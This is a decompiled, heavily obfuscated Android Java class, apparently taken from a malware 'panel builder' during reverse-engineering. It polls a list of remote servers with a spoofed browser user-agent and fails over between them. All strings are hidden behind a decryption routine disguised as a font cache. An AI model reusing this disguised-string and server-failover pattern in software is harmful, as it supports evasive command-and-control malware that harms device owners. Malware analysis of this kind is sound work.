package v.s;

import android.os.Build;
import app.mobilex.plus.util.TypefaceCache;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class RgFPdG0gpwd4DDDX extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ String ibVTtJUNfrGYbW;
    public final /* synthetic */ int xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ RgFPdG0gpwd4DDDX(String str, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q, int i) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = i;
        this.ibVTtJUNfrGYbW = str;
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        wh3Lv6S5rs6zqjV wh3lv6s5rs6zqjv = (wh3Lv6S5rs6zqjV) obj;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = (b9xRoaXFR1fmOO2Q) obj2;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                break;
        }
        return ((RgFPdG0gpwd4DDDX) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                return new RgFPdG0gpwd4DDDX(this.ibVTtJUNfrGYbW, b9xroaxfr1fmoo2q, 0);
            default:
                return new RgFPdG0gpwd4DDDX(this.ibVTtJUNfrGYbW, b9xroaxfr1fmoo2q, 1);
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r15v10 */
    /* JADX WARN: Type inference failed for: r15v22 */
    /* JADX WARN: Type inference failed for: r15v6 */
    /* JADX WARN: Type inference failed for: r15v7 */
    /* JADX WARN: Type inference failed for: r15v8 */
    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) {
        roAK4OF9CtSmlCJgpQ roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR;
        String strPyu8ovAipBTLYAiKab;
        ArrayList roak4of9ctsmlcjgpq;
        int i = 0;
        Exception e = null;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                ArrayList arrayListDDIMxZXP1V8HdM = ktukzhfmAkOuMU.dDIMxZXP1V8HdM();
                if (arrayListDDIMxZXP1V8HdM.isEmpty()) {
                    return new roAK4OF9CtSmlCJgpQ(new VSZeS5mia3yEXbAe(new Exception(TypefaceCache.obtain("001300770055008200FC00FF00F30097000A00360055008800E400FF00D100A8002D00700052008000E500AD00D700A3"))));
                }
                int size = arrayListDDIMxZXP1V8HdM.size();
                int i2 = 0;
                while (i2 < size) {
                    Object obj2 = arrayListDDIMxZXP1V8HdM.get(i2);
                    i2++;
                    String str = (String) obj2;
                    try {
                        String str2 = KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(this.ibVTtJUNfrGYbW, "?", false) ? "&" : "?";
                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str + this.ibVTtJUNfrGYbW + str2 + TypefaceCache.obtain("00370073005A008A00CF00B600D600FA") + KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(61)).openConnection();
                        ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        ktukzhfmAkOuMU.xDyLpEZyrcKVe0(httpURLConnection);
                        httpURLConnection.setRequestMethod("GET");
                        httpURLConnection.setConnectTimeout(7000);
                        httpURLConnection.setReadTimeout(10000);
                        httpURLConnection.setRequestProperty(TypefaceCache.obtain("00160065005E009500BD009E00D500A2002D0062"), TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B8009300DB00A90036006E000000C700D100B100D600B5002C007F005F00C7") + Build.VERSION.RELEASE + "; " + Build.MODEL + TypefaceCache.obtain("006A0036007A009700E000B300D70090002600740070008E00E400F0008700F400740038000800D100B000F700F9008F0017005B007700CB00B000B300DB00AC00260036007C008200F300B400DD00EE006300550053009500FF00B200D700E800720025000A00C900A000F1008200E9007300360076008800F200B600DE00A200630045005A008100F100AD00DB00E800760025000C00C900A300E9"));
                        int responseCode = httpURLConnection.getResponseCode();
                        if (200 > responseCode || responseCode >= 300) {
                            InputStream errorStream = httpURLConnection.getErrorStream();
                            strPyu8ovAipBTLYAiKab = errorStream != null ? RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(new BufferedReader(new InputStreamReader(errorStream, N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 8192)) : TypefaceCache.obtain("000600640049008800E2");
                        } else {
                            strPyu8ovAipBTLYAiKab = RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 8192));
                        }
                        httpURLConnection.disconnect();
                        if (200 <= responseCode && responseCode < 300) {
                            if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(ktukzhfmAkOuMU.w9sT1Swbhx3hs, str)) {
                                ktukzhfmAkOuMU.w9sT1Swbhx3hs = str;
                            }
                            arrayListDDIMxZXP1V8HdM = new roAK4OF9CtSmlCJgpQ(strPyu8ovAipBTLYAiKab);
                            return arrayListDDIMxZXP1V8HdM;
                        }
                        e = new Exception(TypefaceCache.obtain("000B0042006F00B700B0") + responseCode);
                        arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                    } catch (ConnectException e2) {
                        e = e2;
                        ktukzhfmAkOuMU ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("00040053006F00C700F300B000DC00A900260075004F008E00FF00B1009200A5002F00790058008C00F500BB009200A1002C0064001B");
                        e.getMessage();
                        roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR = ktukzhfmAkOuMU.Ee8d2j4S9Vm5yGuR(str, this.ibVTtJUNfrGYbW);
                        arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                        if (roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR != null && !(roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR.w9sT1Swbhx3hs instanceof VSZeS5mia3yEXbAe)) {
                            arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                            return roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR;
                        }
                    } catch (SocketTimeoutException e3) {
                        e = e3;
                        ktukzhfmAkOuMU ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("00040053006F00C700E400B600DF00A2002C0063004F00C700F600B000C000E7");
                        TypefaceCache.obtain("0063003E007F00B700D900E0009B00FD0063");
                        e.getMessage();
                        roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR = ktukzhfmAkOuMU.Ee8d2j4S9Vm5yGuR(str, this.ibVTtJUNfrGYbW);
                        arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                        if (roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR != null && !(roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR.w9sT1Swbhx3hs instanceof VSZeS5mia3yEXbAe)) {
                            arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                            return roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR;
                        }
                    } catch (UnknownHostException e4) {
                        e = e4;
                        ktukzhfmAkOuMU ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("00040053006F00C700D4009100E100E70021007A0054008400FB00BA00D600E700250079004900C7");
                        TypefaceCache.obtain("006F0036004F009500E900B600DC00A000630052005400AF00BE00F1009C");
                        roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR = ktukzhfmAkOuMU.Ee8d2j4S9Vm5yGuR(str, this.ibVTtJUNfrGYbW);
                        arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                        if (roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR != null && !(roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR.w9sT1Swbhx3hs instanceof VSZeS5mia3yEXbAe)) {
                            arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                            return roak4of9ctsmlcjgpqEe8d2j4S9Vm5yGuR;
                        }
                    } catch (Exception e5) {
                        e = e5;
                        ktukzhfmAkOuMU ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("00040053006F00C700F500AD00C000A800310036005D008800E200FF");
                        e.getMessage();
                    }
                    arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                    arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                    arrayListDDIMxZXP1V8HdM = arrayListDDIMxZXP1V8HdM;
                    e = e;
                }
                if (e == null) {
                    e = new Exception(TypefaceCache.obtain("0002007A005700C700C5008D00FE00B400630070005A008E00FC00BA00D6"));
                }
                return new roAK4OF9CtSmlCJgpQ(new VSZeS5mia3yEXbAe(e));
            default:
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                ArrayList arrayListDDIMxZXP1V8HdM2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM();
                if (arrayListDDIMxZXP1V8HdM2.isEmpty()) {
                    return new roAK4OF9CtSmlCJgpQ(new VSZeS5mia3yEXbAe(new Exception(TypefaceCache.obtain("001300770055008200FC00FF00F30097000A00360055008800E400FF00D100A8002D00700052008000E500AD00D700A3"))));
                }
                int size2 = arrayListDDIMxZXP1V8HdM2.size();
                Exception exc = null;
                while (i < size2) {
                    roak4of9ctsmlcjgpq = arrayListDDIMxZXP1V8HdM2;
                    Object obj3 = roak4of9ctsmlcjgpq.get(i);
                    i++;
                    String str3 = (String) obj3;
                    try {
                        ktukzhfmAkOuMU ktukzhfmakoumu6 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        Serializable serializableJXn4Qf7zpnLjP5 = ktukzhfmAkOuMU.JXn4Qf7zpnLjP5(str3, this.ibVTtJUNfrGYbW);
                        if (!(serializableJXn4Qf7zpnLjP5 instanceof VSZeS5mia3yEXbAe)) {
                            if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(ktukzhfmAkOuMU.w9sT1Swbhx3hs, str3)) {
                                ktukzhfmAkOuMU.w9sT1Swbhx3hs = str3;
                            }
                            roak4of9ctsmlcjgpq = new roAK4OF9CtSmlCJgpQ(serializableJXn4Qf7zpnLjP5);
                            return roak4of9ctsmlcjgpq;
                        }
                        Throwable thDDIMxZXP1V8HdM = roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(serializableJXn4Qf7zpnLjP5);
                        e = thDDIMxZXP1V8HdM instanceof Exception ? (Exception) thDDIMxZXP1V8HdM : null;
                        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str3, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                            ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                        }
                    } catch (Exception e6) {
                        e = e6;
                        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str3, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                            ktukzhfmAkOuMU ktukzhfmakoumu7 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                            ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                        }
                    }
                    exc = e;
                    roak4of9ctsmlcjgpq = roak4of9ctsmlcjgpq;
                }
                if (exc == null) {
                    roak4of9ctsmlcjgpq = arrayListDDIMxZXP1V8HdM2;
                    exc = new Exception(TypefaceCache.obtain("0002007A005700C700C5008D00FE00B400630070005A008E00FC00BA00D6"));
                }
                roak4of9ctsmlcjgpq = arrayListDDIMxZXP1V8HdM2;
                return new roAK4OF9CtSmlCJgpQ(new VSZeS5mia3yEXbAe(exc));
        }
    }
}
